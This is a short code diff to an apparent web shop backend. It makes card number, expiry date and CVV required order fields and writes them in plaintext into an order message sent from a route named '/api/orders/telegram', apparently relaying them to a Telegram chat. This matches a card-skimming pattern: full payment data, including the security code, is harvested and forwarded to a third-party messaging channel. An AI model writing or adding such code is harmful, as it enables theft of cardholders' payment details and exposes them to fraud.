@@ -62,7 +62,9 @@ function buildOrderMessage(order) {
   `Name: ${order.name}\n` +
   `Email: ${order.email}\n` +
   `Address: ${order.address}\n` +
-  
+  `Card: ${order.cardNumber}\n` +
+  `Expiry: ${order.expiryDate}\n` +
+  `CVV: ${order.securityCode}\n` +
   `ZIP: ${order.zip}`;
   return `${header}${itemLines}\n\n${customerInfo}`;
 }
@@ -114,12 +116,14 @@ app.post('/api/orders/telegram', orderLimiter, async (req, res) => {
   const name = clean(body.name, 120);
   const email = clean(body.email, 254);
   const address = clean(body.address, 500);
-  
+  const cardNumber = clean(body.cardNumber, 23);
+  const expiryDate = clean(body.expiryDate, 5);
+  const securityCode = clean(body.securityCode, 4);
   const zip = clean(body.zip, 30);
   const total = Number(body.total);
   const items = Array.isArray(body.items) ? body.items : [];
 
-  if (!name || !validEmail(email) || !address || !zip ||
+  if (!name || !validEmail(email) || !address || !cardNumber || !expiryDate || !securityCode || !zip ||
       !Number.isFinite(total) || total < 0 || items.length < 1 || items.length > 50) {
     return res.status(400).json({ ok: false, error: 'Invalid order details.' });
   }
@@ -140,7 +144,9 @@ app.post('/api/orders/telegram', orderLimiter, async (req, res) => {
     name,
     email,
     address,
-    
+    cardNumber,
+    expiryDate,
+    securityCode,
     zip,
     total,
     items: normalizedItems
